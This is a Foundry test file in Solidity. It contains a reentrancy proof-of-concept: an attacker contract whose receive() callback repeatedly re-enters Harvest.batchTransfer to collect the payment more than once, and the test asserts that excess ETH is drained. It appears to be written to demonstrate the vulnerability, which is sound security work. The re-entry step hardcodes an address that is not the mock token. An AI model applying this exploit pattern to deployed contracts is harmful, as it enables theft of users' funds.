// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Harvest.sol";
import "../src/BidTicket.sol";
import "./lib/Mock721.sol";
import "./lib/Mock1155.sol";
import "./lib/Mock20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

contract ReentrancyAttacker is IERC721Receiver, IERC1155Receiver {
    Harvest public harvest;
    uint256 public attackCount;
    bool public attackMode;
    uint256 public initialBalance;
    uint256 public finalBalance;
    uint256[] public receivedAmounts;

    constructor(Harvest _harvest) {
        harvest = _harvest;
    }

    function attack(TokenType[] calldata types, address[] calldata contracts, uint256[] calldata tokenIds, uint256[] calldata counts) external {
        initialBalance = address(this).balance;
        attackMode = true;
        harvest.batchTransfer(types, contracts, tokenIds, counts);
        attackMode = false;
        finalBalance = address(this).balance;
    }

    receive() external payable {
        receivedAmounts.push(msg.value);
        if (attackMode && attackCount < 3) {
            attackCount++;
            TokenType[] memory types = new TokenType[](1);
            address[] memory contracts = new address[](1);
            uint256[] memory tokenIds = new uint256[](1);
            uint256[] memory counts = new uint256[](1);
            
            types[0] = TokenType.ERC721;
            contracts[0] = address(0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9); 
            tokenIds[0] = attackCount + 1;
            counts[0] = 0;

            harvest.batchTransfer(types, contracts, tokenIds, counts);
        }
    }

    function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
        return this.onERC721Received.selector;
    }

    function onERC1155Received(address, address, uint256, uint256, bytes memory) public virtual override returns (bytes4) {
        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(address, address, uint256[] memory, uint256[] memory, bytes memory) public virtual override returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }

    function getReceivedAmounts() public view returns (uint256[] memory) {
        return receivedAmounts;
    }

    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
        return
            interfaceId == type(IERC721Receiver).interfaceId ||
            interfaceId == type(IERC1155Receiver).interfaceId;
    }
}

contract HarvestReentrancyTest is Test {
    Harvest public harvest;
    BidTicket public bidTicket;
    Mock721 public mock721;
    ReentrancyAttacker public attacker;

    address public theBarn;
    address public user1;

    function setUp() public {
        theBarn = vm.addr(1);
        user1 = vm.addr(2);

        bidTicket = new BidTicket(address(this));
        harvest = new Harvest(address(this), theBarn, address(bidTicket));
        attacker = new ReentrancyAttacker(harvest);

        bidTicket.setHarvestContract(address(harvest));

        mock721 = new Mock721();
        mock721.mint(address(attacker), 10); 

        vm.deal(address(harvest), 10 ether);
        vm.deal(address(attacker), 1 ether);

        harvest.setPrice(0.1 ether);
    }

    function testReentrancyHavertAttack() public {
        console.log("--- Starting Reentrancy Attack Test ---");
        console.log("Initial Harvest balance:", address(harvest).balance);
        console.log("Initial Attacker balance:", address(attacker).balance);
        console.log("Harvest price:", harvest.price());

        TokenType[] memory types = new TokenType[](1);
        address[] memory contracts = new address[](1);
        uint256[] memory tokenIds = new uint256[](1);
        uint256[] memory counts = new uint256[](1);

        types[0] = TokenType.ERC721;
        contracts[0] = address(mock721);
        tokenIds[0] = 1;
        counts[0] = 0;

        vm.startPrank(address(attacker));
        mock721.setApprovalForAll(address(harvest), true);
        attacker.attack(types, contracts, tokenIds, counts);
        vm.stopPrank();

        console.log("--- Attack Completed ---");
        console.log("Final Harvest balance:", address(harvest).balance);
        console.log("Final Attacker balance:", address(attacker).balance);
        console.log("Attack count:", attacker.attackCount());

        uint256 balanceIncrease = address(attacker).balance - attacker.initialBalance();
        console.log("Attacker balance increase:", balanceIncrease);

        uint256[] memory receivedAmounts = attacker.getReceivedAmounts();
        console.log("Received amounts:");
        for (uint i = 0; i < receivedAmounts.length; i++) {
            console.log("  Payment", i + 1, ":", receivedAmounts[i]);
        }

        assertGt(attacker.attackCount(), 1, "Reentrancy attack failed");
        assertGt(balanceIncrease, harvest.price(), "Attacker didn't receive more ETH than expected");
        
        uint256 expectedPayment = harvest.price() * (attacker.attackCount() + 1);
        assertEq(balanceIncrease, expectedPayment, "Attacker received incorrect amount of ETH");

        uint256 totalReceived = 0;
        for (uint i = 0; i < receivedAmounts.length; i++) {
            totalReceived += receivedAmounts[i];
        }
        assertEq(totalReceived, balanceIncrease, "Sum of received amounts doesn't match balance increase");

        console.log("--- Vulnerability Analysis ---");
        console.log("Expected single payment:", harvest.price());
        console.log("Total payments received:", balanceIncrease);
        console.log("Number of successful reentrant calls:", attacker.attackCount());
        console.log("Excess ETH received:", balanceIncrease - harvest.price());

        uint256 bidTicketBalance = bidTicket.balanceOf(address(attacker), harvest.bidTicketTokenId());
        console.log("BidTickets minted to attacker:", bidTicketBalance);
        assertEq(bidTicketBalance, attacker.attackCount() + 1, "Incorrect number of BidTickets minted");

        console.log("--- Reentrancy Attack Test Completed ---");
    }
}